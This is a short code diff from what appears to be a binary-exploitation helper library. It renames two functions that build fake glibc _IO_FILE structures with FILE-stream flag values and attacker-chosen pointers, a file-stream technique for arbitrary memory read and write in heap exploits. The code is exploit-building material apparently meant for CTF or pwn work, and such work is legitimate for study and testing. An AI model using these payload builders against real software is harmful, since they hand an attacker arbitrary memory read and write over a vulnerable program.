@@ -1,12 +1,7 @@
-from pwn import FileStructure
+from ..Utils.pwntools_import import FileStructure
 
 
-def FILE_read(target_addr: int, size: int, buf_addr: int):
-    """
-    - input : `target_addr (int)`, `size (int)`, `buf_addr (int)` , `buf_addr + 8` is a valid address
-    - output : `payload (bytes)` , payload of fake `struct _IO_FILE`
-    """
-
+def FILE_read_payload(target_addr: int, size: int, buf_addr: int):
     f = FileStructure()
     f.flags, f.fileno = 0xFBAD0800, 1
     f._IO_write_base, f._IO_write_ptr, f._IO_write_end = target_addr, target_addr + size, 0
@@ -17,12 +12,7 @@ def FILE_read(target_addr: int, size: int, buf_addr: int):
 
 
 
-def FILE_write(target_addr: int, size: int, buf_addr: int):
-    """
-    - input : `target_addr (int)`, `size (int)`, `buf_addsr (int)` , `size` must bigger than `fread`'s size & `buf_addr + 8` is a valid address
-    - output : `payload (bytes)` , payload of fake `struct _IO_FILE`
-    """
-
+def FILE_write_payload(target_addr: int, size: int, buf_addr: int):
     f = FileStructure()
     f.flags, f.fileno = 0xFBAD0000, 0
     f._IO_read_ptr = f._IO_read_end = 0
